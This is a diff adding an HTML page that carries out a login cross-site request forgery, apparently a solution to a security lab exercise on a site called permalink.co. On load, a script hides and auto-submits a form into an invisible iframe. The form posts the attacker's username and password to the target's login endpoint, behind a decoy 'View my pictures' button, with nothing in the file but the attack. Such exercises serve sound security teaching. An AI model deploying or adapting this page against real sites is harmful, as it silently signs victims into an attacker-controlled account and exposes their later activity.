@@ -1,0 +1,26 @@
+<html>
+<head>
+  <style>
+    iframe{
+      display:none;
+    }
+  </style>
+</head>
+<body onload="go()">
+  <script>
+    function go(){
+    document.getElementById("haxform").style.display="none";
+    document.getElementById("haxform").submit();
+    }
+  </script>
+
+  <iframe name="hiddenFrame" class="hide"></iframe>
+  <form id="haxform" target="hiddenFrame" action="http://permalink.co/login?csrfdefense=0&xssdefense=4" method="POST">
+    <input type="hidden" name="username" value="attacker"/>
+    <input type="hidden" name="password" value="l33th4x"/>
+    <input type="submit" value="View my pictures"/>
+  </form>
+
+</body>
+
+</html>
